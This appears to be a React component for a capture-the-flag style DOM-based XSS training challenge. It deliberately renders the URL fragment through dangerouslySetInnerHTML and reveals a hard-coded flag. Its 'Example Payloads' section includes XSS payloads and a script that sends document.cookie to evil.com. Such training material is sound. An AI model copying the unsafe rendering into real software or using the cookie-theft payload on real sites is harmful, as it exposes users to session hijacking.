import React, { useState, useEffect } from 'react';
import { Container, Row, Col, Card, Button, Alert, Form } from 'react-bootstrap';

function DOMXSS() {
  const [welcomeName, setWelcomeName] = useState('Guest');
  const [showFlag, setShowFlag] = useState(false);
  const [customInput, setCustomInput] = useState('');

  useEffect(() => {
    // VULNERABILITY: Direct DOM manipulation from URL hash
    const updateWelcomeFromHash = () => {
      const hash = window.location.hash.substring(1);
      if (hash) {
        const decodedName = decodeURIComponent(hash);
        setWelcomeName(decodedName);
        
        // VULNERABILITY: Direct innerHTML equivalent through React
        // Check for XSS payload patterns
        if (decodedName.includes('script') || decodedName.includes('img') || 
            decodedName.includes('svg') || decodedName.includes('onerror') ||
            decodedName.includes('javascript:')) {
          
          setTimeout(() => {
            setShowFlag(true);
            // Show global flag indicator
            const flagElement = document.getElementById('global-flag-container');
            if (flagElement) {
              flagElement.style.display = 'block';
              setTimeout(() => {
                flagElement.style.display = 'none';
              }, 5000);
            }
          }, 1000);
        }
      }
    };

    // Update on page load
    updateWelcomeFromHash();

    // Listen for hash changes
    window.addEventListener('hashchange', updateWelcomeFromHash);
    
    return () => {
      window.removeEventListener('hashchange', updateWelcomeFromHash);
    };
  }, []);

  const updateNameFromInput = () => {
    if (customInput.trim()) {
      // Update URL hash to trigger DOM manipulation
      window.location.hash = encodeURIComponent(customInput);
    }
  };

  const clearName = () => {
    setCustomInput('');
    setWelcomeName('Guest');
    setShowFlag(false);
    window.location.hash = '';
  };

  const triggerDOMExample = (payload) => {
    setCustomInput(payload);
    window.location.hash = encodeURIComponent(payload);
  };

  return (
    <Container>
      <Row className="justify-content-center">
        <Col md={10}>
          <Card className="shadow">
            <Card.Header className="bg-warning text-dark">
              <h4 className="mb-0">
                <i className="fas fa-code me-2"></i>
                DOM XSS Challenge - Welcome Page
              </h4>
            </Card.Header>
            
            <Card.Body>
              <Alert variant="warning" className="mb-4">
                <i className="fas fa-exclamation-triangle me-2"></i>
                <strong>Challenge:</strong> Exploit the DOM-based XSS vulnerability using URL fragments or the form below.
              </Alert>

              {/* Vulnerable Welcome Section */}
              <div className="vulnerable-content mb-4">
                <div className="welcome-message p-4 bg-light border rounded">
                  <h3>
                    Welcome, <span 
                      // VULNERABILITY: Direct HTML rendering from URL hash
                      dangerouslySetInnerHTML={{ __html: welcomeName }}
                    />!
                  </h3>
                  <p className="text-muted">
                    <i className="fas fa-info-circle me-1"></i>
                    This page uses URL fragments to personalize your experience.
                  </p>
                </div>
              </div>

              {/* Interactive Form */}
              <Card className="mb-4">
                <Card.Body>
                  <h5><i className="fas fa-user-edit me-2"></i>Customize Your Name</h5>
                  <Form className="d-flex gap-2 mb-3">
                    <Form.Control
                      type="text"
                      placeholder="Enter your name..."
                      value={customInput}
                      onChange={(e) => setCustomInput(e.target.value)}
                    />
                    <Button variant="primary" onClick={updateNameFromInput}>
                      Update Name
                    </Button>
                    <Button variant="secondary" onClick={clearName}>
                      Clear
                    </Button>
                  </Form>
                  
                  <div className="d-flex flex-wrap gap-2">
                    <Button 
                      variant="outline-info" 
                      size="sm"
                      onClick={() => triggerDOMExample('Alice')}
                    >
                      Try: Alice
                    </Button>
                    <Button 
                      variant="outline-warning" 
                      size="sm"
                      onClick={() => triggerDOMExample('<b>Bold Name</b>')}
                    >
                      Try: HTML Tags
                    </Button>
                    <Button 
                      variant="outline-danger" 
                      size="sm"
                      onClick={() => triggerDOMExample('<img src=x onerror=alert("DOM XSS!")>')}
                    >
                      Try: XSS Payload
                    </Button>
                  </div>
                </Card.Body>
              </Card>

              {/* Current Fragment Display */}
              <Alert variant="info">
                <strong>Current URL Fragment:</strong> 
                <code className="ms-2">
                  {window.location.hash || '#(none)'}
                </code>
                <br />
                <small>
                  <i className="fas fa-lightbulb me-1"></i>
                  Try manually editing the URL: <code>#{`{your_payload_here}`}</code>
                </small>
              </Alert>

              {/* Flag Reveal */}
              {showFlag && (
                <div className="flag-container" style={{ display: 'block' }}>
                  <h5><i className="fas fa-flag me-2"></i>FLAG CAPTURED!</h5>
                  <code>FLAG{D0M_XSS_CSP_BYP4SS_L33T}</code>
                  <p className="mt-2 mb-0">
                    <i className="fas fa-check-circle me-1"></i>
                    Excellent! You successfully executed DOM-based XSS by manipulating the URL fragment.
                  </p>
                </div>
              )}

              {/* Educational Information */}
              <Card className="mt-4 bg-light">
                <Card.Body>
                  <h6><i className="fas fa-lightbulb me-2"></i>Educational Notes:</h6>
                  <ul className="mb-3">
                    <li><strong>Vulnerability:</strong> Client-side JavaScript processes URL fragments unsafely</li>
                    <li><strong>Location:</strong> URL hash (#) manipulation affects DOM content</li>
                    <li><strong>Example:</strong> <code>page.html#&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                    <li><strong>Bypass:</strong> Can circumvent server-side filters since it's client-side</li>
                  </ul>
                  
                  <h6><i className="fas fa-tools me-2"></i>Example Payloads:</h6>
                  <div className="xss-payload">
                    <code>#&lt;img src=x onerror=alert('XSS')&gt;</code><br />
                    <code>#&lt;svg onload=alert('DOM XSS')&gt;</code><br />
                    <code>#&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code>
                  </div>
                </Card.Body>
              </Card>
            </Card.Body>
          </Card>
        </Col>
      </Row>
    </Container>
  );
}

export default DOMXSS;